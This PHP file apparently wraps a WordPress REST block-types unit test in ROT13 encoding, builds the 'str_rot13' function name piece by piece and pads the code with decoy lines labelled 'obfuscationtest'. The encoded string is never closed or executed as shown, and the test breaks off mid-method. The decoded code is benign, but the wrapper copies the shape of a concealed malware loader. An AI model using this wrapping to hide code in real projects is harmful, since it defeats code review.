<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Oybpx_Glcrf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.5.0
 *
 * @pbiref JC_ERFG_Oybpx_Glcrf_Pbagebyyre
 *
 * @tebhc erfgncv-oybpxf
 * @tebhc erfgncv
 */
pynff ERFG_Oybpx_Glcr_Pbagebyyre_Grfg rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag $fhofpevore_vq
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine vag $fhofpevore_vq
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * Perngr snxr qngn orsber bhe grfgf eha.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Urycre gung yrgf hf perngr snxr qngn.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq      = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$fhofpevore_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);

		$anzr     = 'snxr/grfg';
		$frggvatf = neenl(
			'vpba' => 'grkg',
		);

		ertvfgre_oybpx_glcr( $anzr, $frggvatf );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$nqzva_vq );
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
		haertvfgre_oybpx_glcr( 'snxr/grfg' );
		haertvfgre_oybpx_glcr( 'snxr/vainyvq' );
		haertvfgre_oybpx_glcr( 'snxr/snyfr' );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/jc/i2/oybpx-glcrf', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/oybpx-glcrf'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/oybpx-glcrf/(?C<anzrfcnpr>[n-mN-M0-9_-]+)', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/oybpx-glcrf/(?C<anzrfcnpr>[n-mN-M0-9_-]+)'] );
		$guvf->nffregNeenlUnfXrl( '/jc/i2/oybpx-glcrf/(?C<anzrfcnpr>[n-mN-M0-9_-]+)/(?C<anzr>[n-mN-M0-9_-]+)', $ebhgrf );
		$guvf->nffregPbhag( 1, $ebhgrf['/jc/i2/oybpx-glcrf/(?C<anzrfcnpr>[n-mN-M0-9_-]+)/(?C<anzr>[n-mN-M0-9_-]+)'] );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		// Pbyyrpgvba.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/oybpx-glcrf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
		// Fvatyr.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/oybpx-glcrf/snxr/grfg' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'ivrj', $qngn['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $qngn['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		$oybpx_anzr = 'snxr/grfg';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/snxr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $oybpx_anzr );
		$guvf->purpx_oybpx_glcr_bowrpg( $oybpx_glcr, $qngn[0], $qngn[0]['_yvaxf'] );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		$oybpx_anzr = 'snxr/grfg';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_anzr );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$oybpx_glcr = JC_Oybpx_Glcr_Ertvfgel::trg_vafgnapr()->trg_ertvfgrerq( $oybpx_anzr );
		$guvf->purpx_oybpx_glcr_bowrpg( $oybpx_glcr, $erfcbafr->trg_qngn(), $erfcbafr->trg_yvaxf() );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_fglyrf() {
		$oybpx_anzr   = 'snxr/fglyrf';
		$oybpx_fglyrf = neenl(
			'anzr'         => 'snapl-dhbgr',
			'ynory'        => 'Snapl Dhbgr',
			'fglyr_unaqyr' => 'zlthgra-fglyr',
		);
		ertvfgre_oybpx_glcr( $oybpx_anzr );
		ertvfgre_oybpx_fglyr( $oybpx_anzr, $oybpx_fglyrf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_anzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf( neenl( $oybpx_fglyrf ), $qngn['fglyrf'] );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_trg_vgrz_jvgu_fglyrf_zretr() {
		$oybpx_anzr   = 'snxr/fglyrf2';
		$oybpx_fglyrf = neenl(
			'anzr'         => 'snapl-dhbgr',
			'ynory'        => 'Snapl Dhbgr',
			'fglyr_unaqyr' => 'zlthgra-fglyr',
		);
		$frggvatf     = neenl(
			'fglyrf' => neenl(
				neenl(
					'anzr'         => 'oyhr-dhbgr',
					'ynory'        => 'Oyhr Dhbgr',
					'fglyr_unaqyr' => 'zlthgra-fglyr',
				),
			),
		);
		ertvfgre_oybpx_glcr( $oybpx_anzr, $frggvatf );
		ertvfgre_oybpx_fglyr( $oybpx_anzr, $oybpx_fglyrf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_anzr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$rkcrpgrq = neenl(
			neenl(
				'anzr'         => 'snapl-dhbgr',
				'ynory'        => 'Snapl Dhbgr',
				'fglyr_unaqyr' => 'zlthgra-fglyr',
			),
			neenl(
				'anzr'         => 'oyhr-dhbgr',
				'ynory'        => 'Oyhr Dhbgr',
				'fglyr_unaqyr' => 'zlthgra-fglyr',
			),
		);
		$guvf->nffregFnzrFrgf( $rkcrpgrq, $qngn['fglyrf'] );
	}

	/**
	 * @gvpxrg 47620
	 */
	choyvp shapgvba grfg_trg_oybpx_vainyvq_anzr() {
		$oybpx_glcr = 'snxr/oybpx';
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_oybpx_glcr_vainyvq', $erfcbafr, 404 );
	}

	/**
	 * @gvpxrg 47620
	 * @gvpxrg 57585
	 * @gvpxrg 59346
	 * @gvpxrg 59797
	 */
	choyvp shapgvba grfg_trg_vgrz_vainyvq() {
		$oybpx_glcr = 'snxr/vainyvq';
		$frggvatf   = neenl(
			'gvgyr'            => gehr,
			'pngrtbel'         => gehr,
			'cnerag'           => 'vainyvq_cnerag',
			'naprfgbe'         => 'vainyvq_naprfgbe',
			'nyybjrq_oybpxf'   => 'vainyvq_nyybjrq_oybpxf',
			'vpba'             => gehr,
			'qrfpevcgvba'      => gehr,
			'xrljbeqf'         => 'vainyvq_xrljbeqf',
			'grkgqbznva'       => gehr,
			'nggevohgrf'       => 'vainyvq_nggevohgrf',
			'cebivqrf_pbagrkg' => 'vainyvq_cebivqrf_pbagrkg',
			'hfrf_pbagrkg'     => 'vainyvq_hfrf_pbagrkg',
			'fryrpgbef'        => 'vainyvq_fryrpgbef',
			'fhccbegf'         => 'vainyvq_fhccbegf',
			'fglyrf'           => neenl(),
			'rknzcyr'          => 'vainyvq_rknzcyr',
			'inevngvbaf'       => 'vainyvq_inevngvbaf',
			'oybpx_ubbxf'      => 'vainyvq_oybpx_ubbxf',
			'eraqre_pnyyonpx'  => 'vainyvq_pnyyonpx',
			'rqvgbe_fpevcg'    => gehr,
			'fpevcg'           => gehr,
			'ivrj_fpevcg'      => gehr,
			'rqvgbe_fglyr'     => gehr,
			'fglyr'            => gehr,
		);
		ertvfgre_oybpx_glcr( $oybpx_glcr, $frggvatf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $oybpx_glcr, $qngn['anzr'] );
		$guvf->nffregFnzr( '1', $qngn['gvgyr'] );
		$guvf->nffregAhyy( $qngn['pngrtbel'] );
		$guvf->nffregFnzrFrgf( neenl( 'vainyvq_cnerag' ), $qngn['cnerag'] );
		$guvf->nffregFnzrFrgf( neenl( 'vainyvq_naprfgbe' ), $qngn['naprfgbe'] );
		$guvf->nffregFnzrFrgf( neenl( 'vainyvq_nyybjrq_oybpxf' ), $qngn['nyybjrq_oybpxf'] );
		$guvf->nffregAhyy( $qngn['vpba'] );
		$guvf->nffregFnzr( '1', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzrFrgf( neenl( 'vainyvq_xrljbeqf' ), $qngn['xrljbeqf'] );
		$guvf->nffregAhyy( $qngn['grkgqbznva'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'ybpx'     => neenl( 'glcr' => 'bowrpg' ),
				'zrgnqngn' => neenl( 'glcr' => 'bowrpg' ),
			),
			$qngn['nggevohgrf']
		);
		$guvf->nffregFnzrFrgf( neenl( 'vainyvq_hfrf_pbagrkg' ), $qngn['hfrf_pbagrkg'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['cebivqrf_pbagrkg'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fryrpgbef'], 'vainyvq fryrpgbef qrsnhygf gb rzcgl neenl' );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fhccbegf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fglyrf'] );
		$guvf->nffregAhyy( $qngn['rknzcyr'] );
		$guvf->nffregFnzrFrgf( neenl( neenl() ), $qngn['inevngvbaf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['oybpx_ubbxf'], 'vainyvq oybpx_ubbxf qrsnhygf gb rzcgl neenl' );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['rqvgbe_fpevcg_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fpevcg_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['ivrj_fpevcg_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['ivrj_fpevcg_zbqhyr_vqf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['rqvgbe_fglyr_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fglyr_unaqyrf'] );
		$guvf->nffregSnyfr( $qngn['vf_qlanzvp'] );
		// Qrcerpngrq cebcregvrf.
		$guvf->nffregAhyy( $qngn['rqvgbe_fpevcg'] );
		$guvf->nffregAhyy( $qngn['fpevcg'] );
		$guvf->nffregAhyy( $qngn['ivrj_fpevcg'] );
		$guvf->nffregAhyy( $qngn['rqvgbe_fglyr'] );
		$guvf->nffregAhyy( $qngn['fglyr'] );
	}

	/**
	 * @gvpxrg 47620
	 * @gvpxrg 57585
	 * @gvpxrg 59346
	 * @gvpxrg 59797
	 */
	choyvp shapgvba grfg_trg_vgrz_qrsnhygf() {
		$oybpx_glcr = 'snxr/snyfr';
		$frggvatf   = neenl(
			'gvgyr'            => snyfr,
			'pngrtbel'         => snyfr,
			'cnerag'           => snyfr,
			'naprfgbe'         => snyfr,
			'nyybjrq_oybpxf'   => snyfr,
			'vpba'             => snyfr,
			'qrfpevcgvba'      => snyfr,
			'xrljbeqf'         => snyfr,
			'grkgqbznva'       => snyfr,
			'nggevohgrf'       => snyfr,
			'cebivqrf_pbagrkg' => snyfr,
			'hfrf_pbagrkg'     => snyfr,
			'fryrpgbef'        => snyfr,
			'fhccbegf'         => snyfr,
			'fglyrf'           => snyfr,
			'rknzcyr'          => snyfr,
			'inevngvbaf'       => snyfr,
			'oybpx_ubbxf'      => snyfr,
			'rqvgbe_fpevcg'    => snyfr,
			'fpevcg'           => snyfr,
			'ivrj_fpevcg'      => snyfr,
			'rqvgbe_fglyr'     => snyfr,
			'fglyr'            => snyfr,
			'eraqre_pnyyonpx'  => snyfr,
		);
		ertvfgre_oybpx_glcr( $oybpx_glcr, $frggvatf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $oybpx_glcr, $qngn['anzr'] );
		$guvf->nffregFnzr( '', $qngn['gvgyr'] );
		$guvf->nffregAhyy( $qngn['pngrtbel'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['cnerag'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['naprfgbe'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['nyybjrq_oybpxf'] );
		$guvf->nffregAhyy( $qngn['vpba'] );
		$guvf->nffregFnzr( '', $qngn['qrfpevcgvba'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['xrljbeqf'] );
		$guvf->nffregAhyy( $qngn['grkgqbznva'] );
		$guvf->nffregFnzrFrgfJvguVaqrk(
			neenl(
				'ybpx'     => neenl( 'glcr' => 'bowrpg' ),
				'zrgnqngn' => neenl( 'glcr' => 'bowrpg' ),
			),
			$qngn['nggevohgrf']
		);
		$guvf->nffregFnzrFrgf( neenl(), $qngn['cebivqrf_pbagrkg'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['hfrf_pbagrkg'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fryrpgbef'], 'fryrpgbef qrsnhygf gb rzcgl neenl' );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fhccbegf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fglyrf'] );
		$guvf->nffregAhyy( $qngn['rknzcyr'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['inevngvbaf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['oybpx_ubbxf'], 'oybpx_ubbxf qrsnhygf gb rzcgl neenl' );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['rqvgbe_fpevcg_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fpevcg_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['ivrj_fpevcg_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['ivrj_fpevcg_zbqhyr_vqf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['rqvgbe_fglyr_unaqyrf'] );
		$guvf->nffregFnzrFrgf( neenl(), $qngn['fglyr_unaqyrf'] );
		$guvf->nffregSnyfr( $qngn['vf_qlanzvp'] );
		// Qrcerpngrq cebcregvrf.
		$guvf->nffregAhyy( $qngn['rqvgbe_fpevcg'] );
		$guvf->nffregAhyy( $qngn['fpevcg'] );
		$guvf->nffregAhyy( $qngn['ivrj_fpevcg'] );
		$guvf->nffregAhyy( $qngn['rqvgbe_fglyr'] );
		$guvf->nffregAhyy( $qngn['fglyr'] );
	}

	/**
	 * @gvpxrg 56733
	 */
	choyvp shapgvba grfg_trg_vgrz_qrcerpngrq() {
		$oybpx_glcr = 'snxr/qrcerpngrq';
		$frggvatf   = neenl(
			'rqvgbe_fpevcg' => 'uryyb_jbeyq',
			'fpevcg'        => 'thgraoret',
			'ivrj_fpevcg'   => 'sbb_one',
			'rqvgbe_fglyr'  => 'thgra_gnt',
			'fglyr'         => 'bhg_bs_fglyr',
		);
		ertvfgre_oybpx_glcr( $oybpx_glcr, $frggvatf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf(
			neenl( 'uryyb_jbeyq' ),
			$qngn['rqvgbe_fpevcg_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe rqvgbe_fpevcg_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			neenl( 'thgraoret' ),
			$qngn['fpevcg_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe fpevcg_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			neenl( 'sbb_one' ),
			$qngn['ivrj_fpevcg_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe ivrj_fpevcg_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			neenl( 'thgra_gnt' ),
			$qngn['rqvgbe_fglyr_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe rqvgbe_fglyr_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			neenl( 'bhg_bs_fglyr' ),
			$qngn['fglyr_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe fglyr_unaqyrf.\"
		);
		// Qrcerpngrq cebcregvrf.
		$guvf->nffregFnzr(
			'uryyb_jbeyq',
			$qngn['rqvgbe_fpevcg'],
			\"Raqcbvag qbrfa'g erghea pbeerpg fgevat sbe rqvgbe_fpevcg.\"
		);
		$guvf->nffregFnzr(
			'thgraoret',
			$qngn['fpevcg'],
			\"Raqcbvag qbrfa'g erghea pbeerpg fgevat sbe fpevcg.\"
		);
		$guvf->nffregFnzr(
			'sbb_one',
			$qngn['ivrj_fpevcg'],
			\"Raqcbvag qbrfa'g erghea pbeerpg fgevat sbe ivrj_fpevcg.\"
		);
		$guvf->nffregFnzr(
			'thgra_gnt',
			$qngn['rqvgbe_fglyr'],
			\"Raqcbvag qbrfa'g erghea pbeerpg fgevat sbe rqvgbe_fglyr.\"
		);
		$guvf->nffregFnzr(
			'bhg_bs_fglyr',
			$qngn['fglyr'],
			\"Raqcbvag qbrfa'g erghea pbeerpg fgevat sbe fglyr.\"
		);
	}

	/**
	 * @gvpxrg 56733
	 */
	choyvp shapgvba grfg_trg_vgrz_qrcerpngrq_jvgu_neenlf() {
		$oybpx_glcr = 'snxr/qrcerpngrq-jvgu-neenlf';
		$frggvatf   = neenl(
			'rqvgbe_fpevcg' => neenl( 'uryyb', 'jbeyq' ),
			'fpevcg'        => neenl( 'thgraoret' ),
			'ivrj_fpevcg'   => neenl( 'sbb', 'one' ),
			'rqvgbe_fglyr'  => neenl( 'thgra', 'gnt' ),
			'fglyr'         => neenl( 'bhg', 'bs', 'fglyr' ),
		);
		ertvfgre_oybpx_glcr( $oybpx_glcr, $frggvatf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzrFrgf(
			$frggvatf['rqvgbe_fpevcg'],
			$qngn['rqvgbe_fpevcg_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe rqvgbe_fpevcg_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			$frggvatf['fpevcg'],
			$qngn['fpevcg_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe fpevcg_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			$frggvatf['ivrj_fpevcg'],
			$qngn['ivrj_fpevcg_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe ivrj_fpevcg_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			$frggvatf['rqvgbe_fglyr'],
			$qngn['rqvgbe_fglyr_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe rqvgbe_fglyr_unaqyrf.\"
		);
		$guvf->nffregFnzrFrgf(
			$frggvatf['fglyr'],
			$qngn['fglyr_unaqyrf'],
			\"Raqcbvag qbrfa'g erghea pbeerpg neenl sbe fglyr_unaqyrf.\"
		);
		// Qrcerpngrq cebcregvrf.
		// Fvapr gur fpurzn bayl nyybjf fgevatf be ahyy (ohg ab neenlf), jr erghea gur svefg neenl vgrz.
		// Qrcerpngrq cebcregvrf.
		$guvf->nffregFnzr(
			'uryyb',
			$qngn['rqvgbe_fpevcg'],
			\"Raqcbvag qbrfa'g erghea svefg neenl ryrzrag sbe rqvgbe_fpevcg.\"
		);
		$guvf->nffregFnzr(
			'thgraoret',
			$qngn['fpevcg'],
			\"Raqcbvag qbrfa'g erghea svefg neenl ryrzrag sbe fpevcg.\"
		);
		$guvf->nffregFnzr(
			'sbb',
			$qngn['ivrj_fpevcg'],
			\"Raqcbvag qbrfa'g erghea svefg neenl ryrzrag sbe ivrj_fpevcg.\"
		);
		$guvf->nffregFnzr(
			'thgra',
			$qngn['rqvgbe_fglyr'],
			\"Raqcbvag qbrfa'g erghea svefg neenl ryrzrag sbe rqvgbe_fglyr.\"
		);
		$guvf->nffregFnzr(
			'bhg',
			$qngn['fglyr'],
			\"Raqcbvag qbrfa'g erghea svefg neenl ryrzrag sbe fglyr.\"
		);
	}

	choyvp shapgvba grfg_trg_inevngvba() {
		$oybpx_glcr = 'snxr/inevngvbaf';
		$frggvatf   = neenl(
			'gvgyr'       => 'inevngvbaf oybpx grfg',
			'qrfpevcgvba' => 'n inevngvbaf oybpx grfg',
			'nggevohgrf'  => neenl( 'xvaq' => neenl( 'glcr' => 'fgevat' ) ),
			'inevngvbaf'  => neenl(
				neenl(
					'anzr'        => 'inevngvba',
					'gvgyr'       => 'inevngvba gvgyr',
					'qrfpevcgvba' => 'inevngvba qrfpevcgvba',
					'pngrtbel'    => 'zrqvn',
					'vpba'        => 'purpxznex',
					'nggevohgrf'  => neenl( 'xvaq' => 'sbb' ),
					'vfQrsnhyg'   => gehr,
					'rknzcyr'     => neenl( 'nggevohgrf' => neenl( 'xvaq' => 'rknzcyr' ) ),
					'fpbcr'       => neenl( 'vafregre', 'oybpx' ),
					'xrljbeqf'    => neenl( 'qbtf', 'pngf', 'zvpr' ),
					'vaareOybpxf' => neenl(
						neenl(
							'anzr'       => 'snxr/one',
							'nggevohgrf' => neenl( 'ynory' => 'uv' ),
						),
					),
				),
			),
		);
		ertvfgre_oybpx_glcr( $oybpx_glcr, $frggvatf );
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/oybpx-glcrf/' . $oybpx_glcr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $oybpx_glcr, $qngn['anzr'] );
		$guvf->nffregNeenlUnfXrl( 'inevngvbaf', $qngn );
		$guvf->nffregPbhag( 1, $qngn['inevngvbaf'] );
		$inevngvba = $qngn['inevngvbaf'][0];
		$guvf->nffregFnzr( 'inevngvba gvgyr', $inevngvba['gvgyr'] );
		$guvf->nffregFnzr( 'inevngvba qrfpevcgvba', $inevngvba['qrfpevcgvba'] );
		$guvf->nffregFnzr( 'zrqvn', $inevngvba['pngrtbel'] );
		$guvf->nffregFnzr( 'purpxznex', $inevngvba['vpba'] );
		$guvf->nffregFnzrFrgf( neenl( 'vafregre', 'oybpx' ), $inevngvba['fpbcr'] );
		$guvf->nffregFnzrFrgf( neenl( 'qbtf', 'pngf', 'zvpr' ), $inevngvba['xrljbeqf'] );
		$guvf->nffregFnzrFrgf( neenl( 'nggevohgrf' => neenl( 'xvaq' => 'rknzcyr' ) ), $inevngvba['rknzcyr'] );
		$guvf->nffregFnzrFrgf(
			neenl(
				neenl(
					'anzr'       => 'snxr/one',
					'nggevohgrf' => neenl( 'ynory' => 'uv' ),
				),
			),
			$inevngvba['vaareOybpxf']
		);
		$guvf->nffregFnzrFrgf(
			neenl( 'xvaq' => 'sbb' ),
			$inevngvba['nggevohgrf']
		);
	}

	/**
	 * @gvpxrg 47620
	 * @gvpxrg 57585
	 * @gvpxrg 59346
	 * @gvpxrg 60403
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/oybpx-glcrf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 33, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ncv_irefvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pngrtbel', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cnerag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'naprfgbe', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nyybjrq_oybpxf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vpba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'xrljbeqf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'grkgqbznva', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nggevohgrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cebivqrf_pbagrkg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'hfrf_pbagrkg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fryrpgbef', $cebcregvrf, 'fpurzn zhfg pbagnva fryrpgbef' );
		$guvf->nffregNeenlUnfXrl( 'fhccbegf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fglyrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rknzcyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'inevngvbaf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'oybpx_ubbxf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe_fpevcg_unaqyrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fpevcg_unaqyrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ivrj_fpevcg_unaqyrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'ivrj_fpevcg_zbqhyr_vqf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe_fglyr_unaqyrf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fglyr_unaqyrf', $cebcregvrf );
